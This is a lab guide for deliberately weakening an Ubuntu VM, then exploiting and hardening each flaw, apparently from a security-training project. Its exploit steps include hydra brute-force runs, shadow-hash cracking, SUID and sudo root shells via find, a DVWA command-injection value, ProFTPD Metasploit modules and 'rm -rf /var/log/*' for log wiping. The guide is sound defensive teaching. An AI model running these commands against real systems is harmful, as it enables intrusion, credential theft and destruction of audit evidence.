# 🐧 Ubuntu Desktop — deharden → exploit → harden

This guide walks through the Ubuntu dehardening script. For **every** weakness it introduces you get
the same four things, so each exercise is fully reproducible:

- 🧪 **Seeded by the script** — the exact artifact you can test (a user, a file mode, a setting).
- 🟠 **Exploit** — concrete commands *and the result you should see*.
- 🟢 **Harden** — the fix.
- ✅ **Re-test** — run the same attack again and confirm it now fails.

- **Script:** [`scripts/ubuntu/deharden-ubuntu.sh`](../scripts/ubuntu/deharden-ubuntu.sh) (Bash)
- **Tested on:** Ubuntu Desktop 24.04 and 22.04
- **New to the lab?** Read [lab-setup.md](lab-setup.md) first.

> [!WARNING]
> This script weakens the machine on purpose. Run it **only** in an isolated lab VM (Host-Only
> network) with a **fresh snapshot**. To recover a safe state, restore the snapshot.

## How to run the script

```bash
chmod +x deharden-ubuntu.sh
sudo ./deharden-ubuntu.sh          # type DEHARDEN to confirm
# sudo ./deharden-ubuntu.sh -y --no-apt   # unattended, and skip apt installs (offline VM)
sudo reboot                        # so ASLR / AppArmor / services settle
```

Flags: `-y` unattended · `--no-apt` skip all package installs · `--no-web` skip the DVWA web app
(row 5) · `--ftp` *also* build the optional vulnerable FTP server (row 8b — off by default, needs a
source URL). DVWA needs internet and adds a few minutes; use `--no-apt`/`--no-web` on an offline or
minimal VM.

- **Backups:** `/root/deharden-backups-<date>/` · **Log:** `/var/log/deharden-lab.log`
- **Demo accounts it creates:** `root / toor` and `trainee / 123456` — both are in `rockyou.txt`,
  so they are genuinely crackable, and their hashes are stored as **MD5 (`$1$…`)** on purpose.
  (With `--ftp` it also creates `ftpuser / ftp123` for the FTP service.)

## Attacker box prerequisites

The 🟠 commands run from the attacker VM (e.g. Kali). You'll need `nmap`, `hydra`, `john`, `hashcat`
and the wordlist:

```bash
sudo gunzip -k /usr/share/wordlists/rockyou.txt.gz   # if it's still gzipped
export IP=192.168.56.20                              # <-- the victim's IP (ip a on the victim)
```

---

## 1. SSH wide open: root login, no retry limit, legacy crypto
- 🧪 **Seeded:** `sshd_config` sets `PermitRootLogin yes`, `PermitEmptyPasswords yes`,
  `MaxAuthTries 100`, and **adds** legacy `Ciphers/MACs/KexAlgorithms` (CBC, 3DES, `hmac-md5`,
  `diffie-hellman-group1-sha1`) *alongside* the modern ones; `root` has the password `toor`.
  > **Why both legacy and modern?** If the server offered *only* legacy algorithms, modern OpenSSH and
  > hydra would refuse the handshake (`no matching key exchange method` / `kex error: no match`) and you
  > couldn't attack it at all. Offering the weak algorithms *in addition* keeps the misconfiguration
  > visible to `nmap` while letting current clients connect — which is the realistic "server still
  > accepts weak crypto" finding.
- 🟠 **Exploit:**
  ```bash
  nmap -p22 --script ssh2-enum-algos $IP        # lists the weak cbc / 3des / hmac-md5 / group1 algos
  hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://$IP -t4
  #  => [22][ssh] host: <IP>  login: root  password: toor
  ssh root@$IP                                   # you are now root
  # Show the downgrade explicitly — force the deprecated algorithms a hardened server would reject:
  ssh -oKexAlgorithms=+diffie-hellman-group1-sha1 -oCiphers=+aes256-cbc -oMACs=+hmac-md5 root@$IP
  ```
- 🟢 **Harden:** in `/etc/ssh/sshd_config` set `PermitRootLogin no`, `PermitEmptyPasswords no`,
  `MaxAuthTries 4`, `AllowGroups sshadmins`, and restrict to modern algorithms only, e.g.
  `Ciphers aes256-gcm@openssh.com,chacha20-poly1305@openssh.com`,
  `KexAlgorithms curve25519-sha256`, `MACs hmac-sha2-256`; then `systemctl restart ssh`.
- ✅ **Re-test:** `ssh root@$IP` → *Permission denied*; the hydra run no longer finds root; the
  `-oCiphers=+aes256-cbc` downgrade attempt now fails with *no matching cipher*.

## 2. Weak passwords (`root/toor`, `trainee/123456`)
- 🧪 **Seeded:** both accounts exist with those exact weak passwords.
- 🟠 **Exploit:**
  ```bash
  printf 'root\ntrainee\n' > users.txt
  hydra -L users.txt -P /usr/share/wordlists/rockyou.txt ssh://$IP -t4
  #  => finds root:toor and trainee:123456
  ```
- 🟢 **Harden:** set strong passwords (`passwd trainee`, `passwd root`) and enforce the policy in row 3.
- ✅ **Re-test:** the dictionary run exhausts `rockyou.txt` with no hit.

## 3. No complexity, no lockout (faillock), MD5 hashes
- 🧪 **Seeded:** `/etc/security/pwquality.conf` → `minlen=1`, no complexity; `pam_faillock` removed;
  `ENCRYPT_METHOD MD5` in `login.defs`; and the demo passwords are **re-hashed as MD5** so
  `/etc/shadow` really contains `$1$…` entries.
- 🟠 **Exploit (offline, pairs with row 6 — shadow is world-readable):**
  ```bash
  # on the victim (any user can read it) — copy the lines to the attacker box
  grep -E 'root|trainee' /etc/shadow > hashes.txt
  hashcat -m 500 hashes.txt /usr/share/wordlists/rockyou.txt     # -m 500 = md5crypt
  #  or:  john --format=md5crypt hashes.txt
  #  => recovers 'toor' and '123456' in seconds (MD5 is fast + no complexity required)
  ```
  Online, because `faillock` is gone, `hydra ssh://$IP` can try forever without locking anyone out.
- 🟢 **Harden:**
  - `/etc/security/pwquality.conf`: `minlen=14`, `minclass=4`
  - `/etc/pam.d/common-auth`: `auth requisite pam_faillock.so preauth deny=5 unlock_time=900`
  - `/etc/login.defs`: `ENCRYPT_METHOD SHA512`, then reset the passwords so new `$6$` hashes are stored
- ✅ **Re-test:** new hashes are `$6$` (SHA-512) and the strong passwords aren't in `rockyou.txt`, so
  hashcat/john exhaust the wordlist; online brute force locks out after 5 tries.

## 4. ASLR disabled
- 🧪 **Seeded:** `kernel.randomize_va_space = 0`.
- 🟠 **Exploit (prove it without writing an exploit):**
  ```bash
  cat /proc/sys/kernel/randomize_va_space          # => 0
  for i in 1 2 3; do awk '/libc/{print $1; exit}' /proc/self/maps; done
  #  => the libc base address is IDENTICAL every run -> memory layout is predictable,
  #     which is exactly what makes ret2libc / ROP exploitation reliable.
  ```
- 🟢 **Harden:** `sysctl -w kernel.randomize_va_space=2` and persist it in `/etc/sysctl.conf`.
- ✅ **Re-test:** the loop above now prints a **different** libc base each run.

## 5. AppArmor disabled → exploit an unconfined web app (DVWA) to read `/etc/passwd`
- 🧪 **Seeded:** the `apparmor` service is stopped/disabled (profiles in `complain`), **and** DVWA
  (Damn Vulnerable Web Application) is installed at `http://<IP>/dvwa`, served by Apache/PHP with **no
  AppArmor confinement**. Because nothing confines the web process, a web flaw can read any file the
  Apache user can — including `/etc/passwd` (and `/etc/shadow`, made world-readable in row 6).
- 🟠 **Exploit:**
  1. Browse to `http://<IP>/dvwa`, log in as `admin / password`, click *Create / Reset Database*, then
     set *DVWA Security* to **Low**.
  2. Open the **Command Injection** page. The field runs `ping <input>`; chain a second command:
     ```
     127.0.0.1; cat /etc/passwd
     ```
     → the full `/etc/passwd` is returned in the page. Try `; cat /etc/shadow` too (readable thanks to
     row 6). The **File Inclusion** page shows the same impact via `?page=/etc/passwd`.
  3. First confirm nothing is confined: `sudo aa-status` → *"0 profiles are in enforce mode"*.
- 🟢 **Harden:** turn AppArmor back on and confine Apache so the web process can't read secrets even
  though Unix permissions allow it:
  ```bash
  systemctl enable --now apparmor
  sudo cp scripts/ubuntu/apparmor/usr.sbin.apache2 /etc/apparmor.d/usr.sbin.apache2
  sudo apparmor_parser -r /etc/apparmor.d/usr.sbin.apache2
  sudo aa-enforce /etc/apparmor.d/usr.sbin.apache2
  sudo systemctl reload apache2
  sudo aa-enforce /etc/apparmor.d/*     # enforce the rest of the system profiles too
  ```
  > The shipped profile ([`scripts/ubuntu/apparmor/usr.sbin.apache2`](../scripts/ubuntu/apparmor/usr.sbin.apache2))
  > is a starting point — Apache/PHP paths vary by Ubuntu release. If a legitimate page breaks under
  > enforce, run `sudo aa-logprof` and let it add what the app really needs.
- ✅ **Re-test:** repeat the `127.0.0.1; cat /etc/passwd` injection — it now returns nothing /
  *Permission denied*, because AppArmor (MAC) denies the read; `sudo aa-status` lists Apache in
  **enforce** mode. The web bug still exists, but its blast radius is contained.

## 6. `/etc/shadow` world-readable; SUID on `find` and `/tmp/rootbash`
- 🧪 **Seeded:** `chmod 644 /etc/shadow`; SUID bit on `/usr/bin/find`; a SUID copy at `/tmp/rootbash`.
- 🟠 **Exploit (as the low-priv `trainee`):**
  ```bash
  ls -l /etc/shadow                       # => -rw-r--r-- : readable by everyone (feeds row 3)
  find / -perm -4000 -type f 2>/dev/null  # => lists /usr/bin/find and /tmp/rootbash
  find . -exec /bin/sh -p \; -quit        # GTFOBins: drops a shell with euid=0
  id                                       # => uid=1001(trainee) euid=0(root)
  /tmp/rootbash -p                        # second vector: also euid=0
  ```
- 🟢 **Harden:** `chmod 640 /etc/shadow`; `chmod u-s /usr/bin/find`; `rm -f /tmp/rootbash`; audit the
  whole system with `find / -perm -4000 -type f 2>/dev/null`.
- ✅ **Re-test:** `cat /etc/shadow` as `trainee` → *Permission denied*; `find … -exec` keeps `trainee`'s uid.

## 7. Insecure sudo: `trainee` has NOPASSWD, no log, no pty
- 🧪 **Seeded:** `/etc/sudoers.d/90-lab-deharden` lets `trainee` run `find` as root with no password.
- 🟠 **Exploit (as `trainee`):**
  ```bash
  sudo -l                                  # => (ALL) NOPASSWD: /usr/bin/find
  sudo find . -exec /bin/sh \; -quit       # GTFOBins: root shell, no password asked
  id                                        # => uid=0(root)
  ```
- 🟢 **Harden:** remove the rule from `/etc/sudoers.d/`; with `visudo` set `Defaults use_pty`,
  `Defaults logfile="/var/log/sudo.log"`, `Defaults timestamp_timeout=15`.
- ✅ **Re-test:** `sudo find …` now prompts for a password and is logged in `/var/log/sudo.log`.

## 8. Extra services: telnet (cleartext), avahi, cups
- 🧪 **Seeded:** `telnetd` installed and active; `avahi-daemon` and `cups` enabled.
- 🟠 **Exploit:**
  ```bash
  nmap -sV $IP                             # => 23/tcp open telnet  (plus avahi/cups)
  hydra -L users.txt -P /usr/share/wordlists/rockyou.txt telnet://$IP
  sudo tcpdump -i any port 23 -A           # watch a telnet login -> credentials in cleartext
  ```
- 🟢 **Harden:** `apt purge -y telnetd`; `systemctl disable --now avahi-daemon cups`.
- ✅ **Re-test:** `nmap -sV $IP` no longer shows 23/tcp; nothing listens on the removed services.

## 8b. Outdated software: a vulnerable ProFTPD (optional — patch, don't just delete)
This exercise teaches **patch management**: run an old FTP server, detect its version, find a public
exploit, then fix it by **upgrading** (not deleting) so the service stays up but secured.

> [!NOTE]
> **This module is opt-in and needs you to supply the source.** Old ProFTPD releases aren't on GitHub
> and the SourceForge/FTP mirrors block scripted downloads, so the script won't fetch them reliably.
> Download a vulnerable release tarball once (e.g. `proftpd-1.3.3c.tar.gz`, or `1.3.3a` which is kept
> on the Debian snapshot archive) onto the victim VM, then run:
> ```bash
> sudo PROFTPD_SRC_URL=file:///root/proftpd-1.3.3c.tar.gz ./deharden-ubuntu.sh -y --ftp
> ```
> The script compiles it (with modern-gcc compatibility flags) and runs it on port 21 as
> `ftpuser / ftp123`.

- 🧪 **Seeded (with `--ftp`):** the chosen ProFTPD version running on port 21.
- 🟠 **Exploit:**
  ```bash
  nmap -sV -p21 $IP            # => 21/tcp open ftp  ProFTPD <version>
  searchsploit proftpd 1.3.3   # => public exploits for that line
  ```
  Which exploit applies depends on the version you deploy, for example:
  - **1.3.3a / 1.3.3b** → CVE-2010-4221 (Telnet IAC overflow), Metasploit
    `exploit/unix/ftp/proftpd_telnet_iac` — a real pre-auth RCE (ASLR is already off in row 4, which
    helps it land).
  - **1.3.3c (trojaned tarball)** → the `HELP ACIDBITCHEZ` backdoor,
    `exploit/unix/ftp/proftpd_133c_backdoor`. Only the compromised 2010 tarball is vulnerable; a clean
    1.3.3c build is not.
- 🟢 **Harden — update instead of removing:** replace the old build with the distro's current, patched
  ProFTPD so the service keeps working:
  ```bash
  sudo systemctl disable --now proftpd-lab
  sudo apt-get install -y proftpd-core      # current, patched version from the repo
  sudo systemctl enable --now proftpd
  ```
- ✅ **Re-test:** `nmap -sV -p21 $IP` now reports a **current** ProFTPD, and the old exploit no longer
  applies — available, but patched.

## 9. Firewall disabled
- 🧪 **Seeded:** `ufw` disabled; `iptables` policies set to ACCEPT and flushed.
- 🟠 **Exploit:** `nmap -sS -p- $IP` → every listening port is reachable.
- 🟢 **Harden:** `ufw default deny incoming`; `ufw allow 22/tcp`; `ufw enable`.
- ✅ **Re-test:** `nmap -sS -p- $IP` now shows only the ports you explicitly allowed (e.g. 22).

## 10. Network forwarding and redirects enabled
- 🧪 **Seeded:** `net.ipv4.ip_forward=1`, `send_redirects=1`, `accept_redirects=1`.
- 🟠 **Exploit:**
  ```bash
  sysctl net.ipv4.ip_forward               # => 1 : the host can route/pivot traffic
  ```
  With a third host present, the victim can be used as a MITM relay (`arpspoof`, `ettercap`).
- 🟢 **Harden:** `sysctl -w net.ipv4.ip_forward=0` and `net.ipv4.conf.all.send_redirects=0`
  (persist in `/etc/sysctl.conf`).
- ✅ **Re-test:** `sysctl net.ipv4.ip_forward` → `0`.

## 11. Auditing and log forwarding disabled
- 🧪 **Seeded:** `auditd` stopped/disabled; any remote rsyslog forwarding moved aside.
- 🟠 **Exploit (after getting root):**
  ```bash
  systemctl is-active auditd               # => inactive : actions aren't recorded
  rm -rf /var/log/*                        # the trail is gone and nothing was shipped off-box
  ```
- 🟢 **Harden:** `systemctl enable --now auditd` with rules such as `-w /etc/sudoers -p wa -k scope`;
  forward logs to a remote collector via rsyslog.
- ✅ **Re-test:** `ausearch -k scope` shows events; deletions are mirrored on the remote collector.

## 12. Automatic updates disabled
- 🧪 **Seeded:** `unattended-upgrades` disabled; periodic update lists off.
- 🟠 **Exploit:**
  ```bash
  nmap -sV $IP                             # read a service + version
  searchsploit <service> <version>          # => known public exploits for the unpatched version
  ```
- 🟢 **Harden:** `apt update && apt upgrade`; re-enable `unattended-upgrades`.
- ✅ **Re-test:** the service version is current and `searchsploit` no longer maps to a usable exploit.

---

## Suggested loop

For each row: **exploit → harden → re-run the exact same attack and confirm it fails.** Restore the
`fresh` snapshot before the next session so you always start from a known state.

➡️ Next target: [Windows Server 2019 guide](windows-server-2019.md)
